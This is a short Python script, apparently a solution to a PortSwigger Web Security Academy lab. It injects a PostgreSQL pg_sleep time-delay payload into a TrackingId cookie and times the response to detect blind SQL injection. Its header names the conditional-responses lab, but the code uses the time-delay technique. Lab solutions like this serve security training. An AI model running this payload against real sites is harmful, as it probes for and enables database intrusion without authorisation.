# Web Security Academy Port Swigger
# Blind SQL injection with conditional responses lab
#
import requests
import argparse
import time
from urllib.parse import quote_plus


parser = argparse.ArgumentParser()
parser.add_argument("url", help="URL to vulnerable site")
args = parser.parse_args()

sqls = {
    "SqlTimeDelay":
        "' ||pg_sleep(10)--"
}


session = requests.Session()
response = session.get(args.url)
tracking_id = session.cookies.get_dict()['TrackingId']
tracking_id += quote_plus(sqls['SqlTimeDelay'])
session.cookies.set('TrackingId', tracking_id, domain='web-security-academy.net')

start = time.time()
res = session.get(args.url)
stop = time.time()

if res.status_code == 200:
    if stop - start > 10:
        print('SQL Time Delay Injection detected')
    else:
        print('SQL Time Delay Injection not detected')
else:
    print('URL request faled')

